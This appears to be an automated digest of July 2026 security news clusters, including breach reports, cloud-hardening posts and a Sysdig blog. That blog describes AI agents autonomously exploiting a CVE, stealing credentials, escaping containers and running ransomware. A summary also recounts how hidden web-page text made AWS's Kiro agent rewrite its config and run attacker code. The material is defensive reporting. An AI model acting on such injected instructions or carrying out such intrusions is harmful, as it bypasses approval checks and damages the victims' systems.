- Fetch status: fetch_failed:HTTPError
- Member count: 4
- Corroborating source count: 3
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- affected_products: GitHub, Packagist, cPanel
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: GitHub
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/ryanmerket [link] [comments]
```

#### Corroborating sources (3)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: GitHub issues $100,000 bounty for critical RCE vulnerability
  - Published: 2026-07-22T22:21:24+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
  - Summary: submitted by /u/ryanmerket [link] [comments]
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: GitHub revamps bug bounty program with new VIP tier, payout changes
  - Published: 2026-07-23T08:35:50+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/23/github-bug-bounty-program-changes/
  - Summary: GitHub is changing its bug bounty program to reward higher-quality vulnerability reports and reduce low-effort submissions, including AI-generated reports. The changes will take effect on July 27, 2026. Reports submitted before that date will be honored under the previous bounty structure. “Alongside the growth in legitimate reports, we’ve seen a sharp increase in submissions that don’t demonstrate real security impact. These include reports without a proof of concept, theoretical attack scenarios that don’t hold up … More → The post GitHub revamps bug bounty program with new VIP tier, payout changes appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Weaponize GitHub Actions Runners to Target cPanel and WHM Servers
  - Published: 2026-07-23T11:28:54+00:00
  - Link: https://thehackernews.com/2026/07/attackers-weaponize-github-actions.html
  - Summary: Cybersecurity researchers have shed light on a large-scale campaign that has turned compromised GitHub repositories into distributed attack infrastructure designed to target cPanel and WebHost Manager (WHM) instances. The activity involves malicious Packagist development versions spanning 10 packages associated with a legitimate PHP and DevOps developer, dinushchathurya, between July 12 and 13,

### Cluster 8fec99ded9 — score 9

- Title: Rondo Meets Geoserver, (Wed, Jul 22nd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-22T17:35:33+00:00
- Link: https://isc.sans.edu/diary/rss/33176
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
This isn&#;x26;#;39;t a new attack, but something I saw "pop-up" in our logs this week:
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Rondo Meets Geoserver, (Wed, Jul 22nd)
  - Published: 2026-07-22T17:35:33+00:00
  - Link: https://isc.sans.edu/diary/rss/33176
  - Summary: This isn&#;x26;#;39;t a new attack, but something I saw "pop-up" in our logs this week:

### Cluster 6e646120d9 — score 9

- Title: Captive Portal Detection, (Tue, Jul 21st)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-21T13:44:56+00:00
- Link: https://isc.sans.edu/diary/rss/33172
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Captive Portal Detection, (Tue, Jul 21st)
  - Published: 2026-07-21T13:44:56+00:00
  - Link: https://isc.sans.edu/diary/rss/33172
  - Summary: Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.

### Cluster c715bd520f — score 9

- Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-19T15:00:38+00:00
- Link: https://isc.sans.edu/diary/rss/33164
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
  - Published: 2026-07-19T15:00:38+00:00
  - Link: https://isc.sans.edu/diary/rss/33164
  - Summary: We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.

### Cluster 9454090822 — score 9

- Title: Four ways AI has fundamentally changed the threat landscape in 2026
- Source: Sysdig (detection_response_operations)
- Published: 2026-07-21T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- affected_products: Kubernetes
- cve_ids: CVE-2026-39987
- urgency_signals: actively_exploited
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- affected_products: Kubernetes
- cve_ids: CVE-2026-39987
- urgency_signals: actively_exploited
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Summary

```
Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.
```

#### Full body

```
< back to blog Four ways AI has fundamentally changed the threat landscape in 2026 Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Published: July 21, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more For years, the threat landscape has held a familiar shape: skilled humans writing malware, scanning for known vulnerabilities, and selling stolen data or access to enterprise environments on dark web forums. That version still exists. It's just no longer the only version defenders have to deal with. I’ve worked with the Sysdig Threat Research Team (TRT) for the last four years. Over that time, attacks have gotten faster — vulnerabilities exploited hours after advisories are published, attacks unfolding in minutes — but recently, we’ve been documenting something structurally different. We’re now seeing not just attackers using AI, but attacks where AI is doing the work, planning, executing, and adapting in real time. Over the last six months, four distinct themes have emerged to describe how agentic AI is fundamentally changing the threat landscape. Each of those themes has been seen “in the wild” by the Sysdig TRT; they are not predictions but the culmination of research and field evidence. 1. Enter the agentic threat actor The most significant shift the Sysdig TRT has observed recently is that AI is increasingly conducting the attacks, end to end. We define an agentic threat actor (ATA) as an operator whose attack capability is delivered by an AI agent rather than a human at the keyboard using either a hand-built or AI-developed toolkit. In essence, the AI agent reads environment output, reasons about what to do next in real-time, and executes attack steps continuously without a human making decisions at each step. The difference between an ATA and a human using an AI-developed toolkit, or prompting an LLM as it moves through an environment, is autonomy. A human-in-the-loop model leaves noticeable breaks in the attack timeline where human reasoning exists, and prompt evolution would be evident in the script changes of the agent’s attack. An ATA doesn’t pause. Access to exfiltration in four pivots In May 2026, the Sysdig TRT witnessed an ATA move from initial access through a marimo vulnerability (CVE-2026-39987) to internal database exfiltration in only four pivots in under an hour . Without a human leading the way, the agent extracted credentials, replayed them to retrieve an SSH private key, and used that to drive SSH sessions against a downstream server. Comments leaked into the command stream, and commands built for machine consumption make it obvious that the attack was built by an LLM, for an LLM. What the Sysdig TRT determined after examining this attack was that there was no hesitation between steps, no latency, and artifacts in the payload that no human attacker would ever write into a script. Container escape and Kubernetes secrets In a separate operation, the Sysdig TRT caught an ATA escaping a container and dumping Kubernetes secrets. This was the first time an autonomous attack went beyond the application layer to the orchestration plane — the layer that autonomously controls workload scheduling, secrets, and cluster configuration. Container escape to Kubernetes secrets is the kind of kill chain that isn’t often seen from human attackers because it requires significant expertise to execute. This case demonstrated that an operator can now send an agent to chain the attack together for them, with no prior knowledge necessary. Agentic ransomware Then came JADEPUFFER , the first documented case of agentic ransomware: a complete extortion operation driven end-to-end by an AI agent. The agent found a year-old vulnerability in an internet-facing Langflow instance and enumerated the environment. It specifically scanned for and har
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Four ways AI has fundamentally changed the threat landscape in 2026
  - Published: 2026-07-21T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
  - Summary: Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.

### Cluster 38eb29d9d7 — score 9

- Title: Major Australian energy supplier confirms customer data compromised
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-07-23T13:20:00+00:00
- Link: https://therecord.media/australia-origin-energy-data-breach
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.
```

#### Full body

```
A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Major Australian energy supplier confirms customer data compromised
  - Published: 2026-07-23T13:20:00+00:00
  - Link: https://therecord.media/australia-origin-energy-data-breach
  - Summary: Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.

### Cluster c577dfeff7 — score 9

- Title: Is Patching Dead? Vulnerability Management in the Post-Mythos Era
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-07-23T15:00:00+00:00
- Link: https://www.securityweek.com/is-patching-dead-vulnerability-management-in-the-post-mythos-era/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: critical_infrastructure, government
- affected_products: Anthropic/Claude, Linux kernel
- tools_used: Palo Alto Networks
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government, critical_infrastructure
- affected_products: Linux kernel, Anthropic/Claude
- tools_used: Palo Alto Networks
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
You cannot out-patch a machine that writes a working exploit from a vulnerability description in twenty hours. Stop trying to optimize a game you cannot win. The post Is Patching Dead? Vulnerability Management in the Post-Mythos Era appeared first on SecurityWeek .
```

#### Full body

```
On July 14, 2026, the White House launched Gold Eagle : a federal clearinghouse that uses frontier AI to identify, rank, and coordinate the remediation of software vulnerabilities across government and critical infrastructure before attackers reach them. Bringing together the Treasury, DHS, DoD, open-source software partners, and operators of American critical infrastructure, Gold Eagle’s engine relies on frontier AI—including Anthropic’s Mythos, the same class of system that surfaced critical flaws inside classified U.S. government software during testing. A government harnessing advanced AI to hunt vulnerabilities is conceding something fundamental: the two-decade model of humans finding and patching vulnerabilities one at a time has stopped keeping pace. Gold Eagle is the national-scale response. The harder question is: what is required inside your own walls? What Changed Mythos is a frontier AI model that surfaces vulnerabilities no prior tool could—from a 27-year-old remote crash in OpenBSD to chained Linux kernel flaws escalating to full system control without human guidance. Anthropic’s roughly 50 Project Glasswing partners have uncovered more than 10,000 high- or critical-severity vulnerabilities in essential software. That capability would be manageable if it stayed with defenders. It did not. In June 2026, Anthropic released Fable to the public; its access was briefly suspended under US export controls that month before being restored, a signal that frontier vulnerability discovery is now treated as controlled technology, closer to a munition than a SaaS release. Look at the operational timelines we face: Advertisement. Scroll to continue reading. Attacker Speed: In March 2026, Sysdig researchers observed threat actors exploiting a CVE within 20 hours of release without a public proof-of-concept (PoC), weaponizing it from the description alone. Mandiant’s M-Trends 2026 report puts the estimated Mean Time to Exploit (MTTE) at negative seven days —meaning exploits now routinely precede public disclosures. Defender Lag: The Verizon 2026 Data Breach Investigations Report puts the median time to fix a known-exploited flaw at 43 days (up from 32 the year prior), with only 26% of vulnerabilities ever fully patched. Extreme Volume: The Forum of Incident Response and Security Teams (FIRST) projects roughly 59,000 new CVEs in 2026 —over 160 per day—with Remote Code Execution (RCE) flaws up 130% from last year. The legacy CVE program was simply not designed for this volume or velocity. Five Ways The Industry Is Responding Rethink the patching process. Cisco overhauled its CVE process after recognizing that assessing risk one flaw at a time is unsustainable, shifting to a risk-based disclosure model with umbrella common-weakness categories and a twice-monthly release schedule. The government reached the same conclusion: in June 2026, CISA’s Binding Operational Directive 26-04 revoked BOD 22-01 (which mandated strict patching deadlines for everything on the KEV catalog). Under BOD 26-04, KEV status is now just one of four variables , evaluated alongside: Public asset exposure Automated exploitability Technical impact (partial vs. total control) We’re moving from patch-everything-on-a-deadline to prioritize-by-realized-risk . As Wendi Whitmore, Chief Security Intelligence Officer at Palo Alto Networks, frames it for boardrooms: “If a vulnerability is published tomorrow with weaponized AI-generated exploit code attached, what is your committed timeline to patch, and who has the authority to invoke it without escalation?” Reduce the exposure. You cannot patch — or defend — what you cannot see. Discovering assets and mapping your attack surface across internet-facing services, legacy hosts, and shadow deployments remains a foundational step. However, in the AI era, exposure management goes beyond open ports; it requires constraining what autonomous agents and non-human identities are permitted to do. The July 2026 breach of Hugging F
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Is Patching Dead? Vulnerability Management in the Post-Mythos Era
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.securityweek.com/is-patching-dead-vulnerability-management-in-the-post-mythos-era/
  - Summary: You cannot out-patch a machine that writes a working exploit from a vulnerability description in twenty hours. Stop trying to optimize a game you cannot win. The post Is Patching Dead? Vulnerability Management in the Post-Mythos Era appeared first on SecurityWeek .

### Cluster 9e44f5cce0 — score 9

- Title: Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-07-23T10:49:10+00:00
- Link: https://www.securityweek.com/upbound-group-says-data-breach-led-to-13-million-in-fraudulent-contract-losses/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, data_breach, ransomware_extortion, zero_day
- affected_industries: financial_services, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, zero_day, data_breach, active_exploitation
- affected_industries: financial_services, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- urgency_signals: actively_exploited, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers recently obtained non-sensitive customer information and other documents from the company. The post Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses appeared first on SecurityWeek .
```

#### Full body

```
Texas-based consumer finance company Upbound Group, Inc. says recent cybersecurity incidents led to a data breach that resulted in millions of dollars in fraudulent contract losses. Upbound offers lease-to-own and flexible payment solutions through brands like Rent-A-Center, Acima, and Brigit. In a filing with the SEC, the company said non-sensitive customer information and other documents were recently obtained by hackers. Upbound believes “the information was subsequently used to facilitate fraudulent lease-to-own agreements, contributing to elevated fraudulent contract losses of approximately $13 million in the Company’s Acima segment during the second quarter of 2026.” The company has notified law enforcement and hired external cybersecurity experts to help boost the security of its systems. Upbound’s investigation is ongoing, but at the time of the SEC disclosure it believes the incidents are not material. Advertisement. Scroll to continue reading. It’s unclear who is behind the attacks on Upbound. No known cybercrime group appears to have listed the company on its leak website. A longtime cybersecurity executive recently launched The Hacker in a Hoodie (HIH) Index , a tracker for material breaches that can be useful to cybersecurity professionals, journalists, policymakers, and others. Related : Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts Related : Ransomware Group Threatening to Leak Data Stolen From Coca-Cola’s Fairlife Related : Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Suno, Paidwork Data Breaches Affect Tens of Millions of Accounts Flaw in Adobe Extension With 300M Installs Enabled WhatsApp Data Theft Fourth SharePoint Vulnerability Exploited in Past Month’s Wave of Attacks Oracle Patches Over 1,400 Vulnerabilities With Quarterly Security Updates Ransomware Group Threatening to Leak Data Stolen From Coca-Cola’s Fairlife OpenAI Says Its AI Models Broke Loose and Hacked Hugging Face Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Latest News OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider Is Patching Dead? Vulnerability Management in the Post-Mythos Era Chick-fil-A Accounts Get Fried in Credential Stuffing Attack Abstract Raises $25 Million to Expand Composable Security Operations Platform Nuclear-Sabotage Malware Benchmark Trips Up Most Frontier AI Models Assaf Keren Appointed New CISO of Meta New Check Point Zero-Day Vulnerability Exploited in the Wild US Warns of Iranian Hackers Targeting Siemens, Schneider, and Rockwell ICS Devices Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is outpacing remediation, where risk is growing fastest, and what security leaders can do to close the gap before attackers take advantage. Register Virtual Event: CodeSecCon 2026 August 19, 2026 CodeSecCon bridges the gap between dev and security. Discover best practices for secure coding, innovative risk-reduction tools, and safe AI integration to cultivate a true DevSecOps culture. Safely secure your apps! Register People on the Move John DeSimone, the former CEO of Nightwing, has been named Chief Operating Officer at Everfox. Sectigo has appointed Pre
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses
  - Published: 2026-07-23T10:49:10+00:00
  - Link: https://www.securityweek.com/upbound-group-says-data-breach-led-to-13-million-in-fraudulent-contract-losses/
  - Summary: Hackers recently obtained non-sensitive customer information and other documents from the company. The post Upbound Group Says Data Breach Led to $13 Million in Fraudulent Contract Losses appeared first on SecurityWeek .

### Cluster 8cd8d46bd5 — score 9

- Title: Do more with AWS WAF labels using dynamic label interpolation
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-07-21T17:03:16+00:00
- Link: https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 2
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- affected_products: AWS, Kubernetes
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched […]
```

#### Full body

```
AWS Security Blog Do more with AWS WAF labels using dynamic label interpolation AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched a credential-stuffing pattern. You can forward that metadata to your origin as request headers, which gives your backend visibility into the decisions AWS WAF made at the edge. You can also use labels to build tiered policies: a low-confidence bot signal might trigger a CAPTCHA challenge, whereas a high-confidence signal blocks the request outright. With the AWS WAF AI Activity Dashboard , launched February 24, 2026, Bot Control now identifies more than 650 bots and agents, including search engine crawlers, data collectors, AI assistants, and large language model (LLM) training crawlers, which is ever increasing over time. In an earlier post , we showed how to group Bot Control labels into confidence levels and use them to drive adaptive user experiences in your application. That approach works well when you can list the labels you care about. After the catalog grows past what you can reasonably enumerate, writing a rule for each label becomes a maintenance burden and consumes rule capacity you’d rather spend elsewhere. With dynamic label interpolation, you can reference labels by namespace instead of by individual name, so a single rule resolves to whichever labels matched during evaluation with no requirement to enumerate each one. You write a ${namespace:} clause in a header value or custom response body, and AWS WAF substitutes the matched values at evaluation time. The feature also gives you synthetic labels you can embed directly in responses, including the client IP address, request JA3 and JA4 fingerprints, and WAF request ID. The rest of this post explains how interpolation resolves labels by referencing four scenarios: forwarding classification data to your application, building custom block and challenge pages, redirecting traffic to a verification step, and segmenting Amazon CloudFront caches by bot category. Interpolation syntax and behavior Dynamic label interpolation uses a ${namespace:} syntax that resolves label values at evaluation time. You can use it in three places: Where What it does Syntax Custom request headers Inserts resolved label values into headers that AWS WAF forwards to your origin. For example, set X-Bot-Category to so your application receives the matched bot category directly. in the header value field Custom response bodies Embeds label values and synthetic labels (such as client IP or request ID) in block pages, challenge pages, and other custom responses. in the response body Content field Custom response headers Insert label values into response headers (for example, Location for redirects). in the response header Value field In each case, AWS WAF reads the labels attached to the request and substitutes the resolved values into the string you provide. The interpolation syntax Include a ${namespace:} clause anywhere you would normally put a header value or custom response body. The trailing colon is what signals interpolation, telling AWS WAF to resolve every label in that namespace rather than match a single named label. AWS WAF evaluates each clause against the labels on the request and follows three rules: Single match – The clause resolves to the label’s terminal value. If the request carries awswaf:managed:aws:bot-control:bot:category:scraping , then ${awswaf:managed:aws:bot-control:bot:category:} resolves to scraping . Multiple matches – AWS WAF strips the namespace prefix and returns the values as a comma-separated list, such as scraping , advertising . No match – The clause resolves to an empty string. This is backward compatible. AWS WAF only interpolates a value when it contains a ${...}
```

#### Corroborating sources (2)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Do more with AWS WAF labels using dynamic label interpolation
  - Published: 2026-07-21T17:03:16+00:00
  - Link: https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
  - Summary: AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched […]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code
  - Published: 2026-07-21T16:06:12+00:00
  - Link: https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
  - Summary: Hidden text on a web page was enough to make Kiro, AWS's agentic coding IDE, rewrite its own configuration file and run an attacker's code on a developer's machine, with no approval step able to stop it. Intezer, in research with Kodem Security, found that a request as ordinary as asking Kiro to summarize a page could end in remote code execution. AWS has patched the issue, and no CVE has been

### Cluster 0256f627d7 — score 9

- Title: Generosity Under Conditions: Hardening Google Cloud Access Management
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-07-21T11:19:00+00:00
- Link: https://cloud.google.com/blog/topics/developers-practitioners/generosity-under-conditions-hardening-google-cloud-access-management/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 2
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In Google Cloud, Identity and Access Management (IAM) helps you maintain access control over your cloud resources and operations. While it includes other features, this is its primary purpose. If you ever tried to harden security over your application, you know the importance of the Principle of Least Privilege ( PoLP ) ‒ grant the absolute minimum permissions to your users and workloads to allow them to perform their tasks. You reach it through use of predefined roles and custom roles and setting up a combination of Allow and Deny IAM policies at project, folder, or organization level. Using a combination of Allow and Deny policies along the resource hierarchy is an effective way to control access. This approach lets you enforce PoLP across many different scenarios. The existing flexible control can be insufficient when resources in the project are shared between multiple workloads or used by more than one team. In many such scenarios, it is possible to bind IAM policies to a specific
```

#### Full body

```
Developers & Practitioners Generosity Under Conditions: Hardening Google Cloud Access Management July 21, 2026 Leonid Yankulin Senior Developer Relations Engineer In Google Cloud, Identity and Access Management (IAM) helps you maintain access control over your cloud resources and operations. While it includes other features, this is its primary purpose. If you ever tried to harden security over your application, you know the importance of the Principle of Least Privilege ( PoLP ) ‒ grant the absolute minimum permissions to your users and workloads to allow them to perform their tasks. You reach it through use of predefined roles and custom roles and setting up a combination of Allow and Deny IAM policies at project, folder, or organization level. Using a combination of Allow and Deny policies along the resource hierarchy is an effective way to control access. This approach lets you enforce PoLP across many different scenarios. The existing flexible control can be insufficient when resources in the project are shared between multiple workloads or used by more than one team. In many such scenarios, it is possible to bind IAM policies to a specific resource in the project. For example, consider the difference between granting the role Artifact Registry Editor ( roles/artifactregistry.editor ) on a project vs. granting it on a specific repository in the project. In the former case, the access is granted to ANY repository in the project. In the latter case, users will have the editor access only to a specific repository. However, binding IAM policies to a resource or service level isn't always possible. This is when it is time to use IAM conditions . Let’s look at two distinct examples that demonstrate the power of conditions when hardening access management: one for traditional administrative roles, and one for modern AI integrations. Use Case 1: Constraining the Power of Admins This case demonstrates how to restrict the specific operations that broad IAM roles are authorized to perform. You can easily scope administrative privileges for managing specific resources in a project by granting a "resource creator" role at the project level and an editor role on a selected resource. It is far more challenging to constrain IAM Admin Roles that are intended to grant access to operations rather than specific resources. A representative example would be the IAM Admin role ( roles/iam.admin ). Users granted this role can grant themselves any other role or create a new one. It greatly exceeds practical needs. The first step is to narrow the access by using the Project IAM Admin role ( roles/resourcemanager.projectIamAdmin ) that provides administrative privileges only at the level of the project. It is possible, however, to restrict the granted privileges even further. For example, suppose you grant the Project IAM Admin role to your builder service account that creates resources and deploys workloads. The workloads only need access to the BigQuery and Agent Platform APIs (formerly Vertex APIs) and permission to write logs and traces. For such a case you can use the following gcloud CLI command or its alternative in Terraform: Loading... gcloud projects add-iam-policy-binding "${PROJECT_ID}" \ --member="serviceAccount:${SA_MAIL}" \ --role="roles/resourcemanager.projectIamAdmin" \ --condition="^:^\ title=LimitedIAMAdmin:\ expression=api.getAttribute('iam.googleapis.com/modifiedGrantsByRole', [])\ .hasOnly([\ 'roles/aiplatform.user',\ 'roles/bigquery.jobUser',\ 'roles/bigquery.dataViewer',\ 'roles/cloudtrace.agent',\ 'roles/logging.logWriter'\ ])" The value of the condition parameter is defined using Common Expression Language ( CEL ) syntax . First it customizes a field delimiter to be a colon instead of a comma and then describes the condition fields title and expression . The expression field uses functions for API attributes to identify which roles are being granted to allow granting only the roles in the comma delimited list. The same ope
```

#### Corroborating sources (2)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Generosity Under Conditions: Hardening Google Cloud Access Management
  - Published: 2026-07-21T11:19:00+00:00
  - Link: https://cloud.google.com/blog/topics/developers-practitioners/generosity-under-conditions-hardening-google-cloud-access-management/
  - Summary: In Google Cloud, Identity and Access Management (IAM) helps you maintain access control over your cloud resources and operations. While it includes other features, this is its primary purpose. If you ever tried to harden security over your application, you know the importance of the Principle of Least Privilege ( PoLP ) ‒ grant the absolute minimum permissions to your users and workloads to allow them to perform their tasks. You reach it through use of predefined roles and custom roles and setting up a combination of Allow and Deny IAM policies at project, folder, or organization level. Using a combination of Allow and Deny policies along the resource hierarchy is an effective way to control access. This approach lets you enforce PoLP across many different scenarios. The existing flexible control can be insufficient when resources in the project are shared between multiple workloads or used by more than one team. In many such scenarios, it is possible to bind IAM policies to a specific
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Google Bets 'Agentic Defense' Strategy Can Outpace Attackers
  - Published: 2026-07-17T11:50:25+00:00
  - Link: https://www.darkreading.com/cloud-security/google-bets-agentic-defense-strategy-outpace-attackers
  - Summary: Google Cloud incorporates key Wiz capabilities into an agentic defense platform to automate threat detection and remediation against AI attacks.

### Cluster bf2815aa81 — score 9

- Title: AI Threat Detection Is Not Enough Without Adversary Intelligence
- Source: Intel 471 (ransomware_ecrime_financial_crime)
